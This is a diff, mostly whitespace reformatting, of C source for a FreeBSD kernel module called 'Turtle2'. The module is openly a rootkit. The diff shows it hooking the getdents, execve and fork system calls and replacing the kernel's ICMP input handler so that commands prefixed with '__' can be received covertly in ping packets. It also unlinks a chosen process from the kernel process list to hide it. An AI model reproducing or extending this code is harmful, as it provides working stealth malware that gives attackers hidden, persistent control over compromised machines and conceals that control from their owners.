@@ -281,22 +281,22 @@ static int getdents_hook(struct thread *td,struct getdents_args *args) /* the sa
 /* Handle ICMP echo packets */
 void icmp_input_hook(struct mbuf *m, int off)
 {
-        struct icmp *icmp_header;
+	struct icmp *icmp_header;
 	char str[256+1];        
 	int len,cnt;
 
 	m->m_len -= off;
-        m->m_data += off;
-         
-        icmp_header = mtod(m, struct icmp *);
-         
-        m->m_len += off;
-        m->m_data -= off;
-         
-        if (icmp_header->icmp_type == ICMP_ECHO &&
-		icmp_header->icmp_data != NULL)
+	m->m_data += off;
+
+	icmp_header = mtod(m, struct icmp *);
+
+	m->m_len += off;
+	m->m_data -= off;
+
+	if (icmp_header->icmp_type == ICMP_ECHO &&
+			icmp_header->icmp_data != NULL)
 	{
-		
+
 		bzero(str,256);	
 		copystr(icmp_header->icmp_data, str, 256, &len);
 		/* a command should be like this: __cmd; */
@@ -306,7 +306,7 @@ void icmp_input_hook(struct mbuf *m, int off)
 			if(str[0] == '_' && str[1] == '_')
 			{
 				cnt = 2;
-	
+
 				sx_xlock(&cmd_lock);
 
 				bzero(cmd,256);
@@ -335,7 +335,7 @@ void icmp_input_hook(struct mbuf *m, int off)
 			icmp_input(m,off);
 		}
 	}
-        
+
 	else
 	{
 		icmp_input(m, off);
@@ -346,28 +346,28 @@ void hide_process() /* hide from allproc list */
 {
 	struct proc *p;
 	sx_xlock(&allproc_lock);
- 
-    
-    	LIST_FOREACH(p, &allproc, p_list) 
+
+
+	LIST_FOREACH(p, &allproc, p_list) 
 	{
-        	PROC_LOCK(p); 
-       
-       		if (p->p_vmspace && !(p->p_flag & P_WEXIT)) 
+		PROC_LOCK(p); 
+
+		if (p->p_vmspace && !(p->p_flag & P_WEXIT)) 
 		{
-        	 	if (strstr(p->p_comm,pname))
+			if (strstr(p->p_comm,pname))
 			{
 #if VERBOSE
 				printf("Turtle2: hiding process %s\n",p->p_comm);
 #endif
-        	 	        LIST_REMOVE(p, p_list);
+				LIST_REMOVE(p, p_list);
 			}
-        	}
- 
-        	PROC_UNLOCK(p);
+		}
+
+		PROC_UNLOCK(p);
 	}
-    
-    	sx_xunlock(&allproc_lock);
- 
+
+	sx_xunlock(&allproc_lock);
+
 }
 
 static int execve_hook(struct thread *td,struct execve_args *args)
@@ -386,10 +386,10 @@ static int fork_hook(struct thread *td,struct fork_args *args)
 
 static int load(struct module *module, int cmd, void *arg)
 {
-        int error = 0;
+	int error = 0;
 	char *pid_s = getenv(KENV_PID);
 	file = getenv(KENV_FILE);
-        pname = getenv(KENV_PNAME);
+	pname = getenv(KENV_PNAME);
 
 	if(pid_s == NULL || file == NULL || pname == NULL)
 	{
@@ -398,7 +398,7 @@ static int load(struct module *module, int cmd, void *arg)
 	}
 
 	pid = strtol(pid_s,NULL,10);
-        
+
 	switch (cmd) 
 	{
 		case MOD_LOAD:
@@ -417,8 +417,8 @@ static int load(struct module *module, int cmd, void *arg)
 			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
 			sdev = make_dev(&turtle2_devsw, 0, UID_ROOT, GID_WHEEL, 0600, "turtle2dev");
 			hide_process(); 
-                 	break;
-        	
+			break;
+
 		case MOD_UNLOAD:
 #if VERBOSE
 			printf("Turtle2: unloaded\n");
@@ -434,19 +434,19 @@ static int load(struct module *module, int cmd, void *arg)
 			sysent[SYS_fork].sy_call = (sy_call_t *)fork;
 			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
 			destroy_dev(sdev);
-                 	break;
-        	default:
-                 	error = EINVAL;
-                 	break;
-        }
-        
+			break;
+		default:
+			error = EINVAL;
+			break;
+	}
+
 	return error;
 }
 
 static moduledata_t turtle2_mod = {
-        "turtle2",            
-        load,                    
-        NULL                     
+	"turtle2",            
+	load,                    
+	NULL                     
 };
 
 DECLARE_MODULE(turtle2, turtle2_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
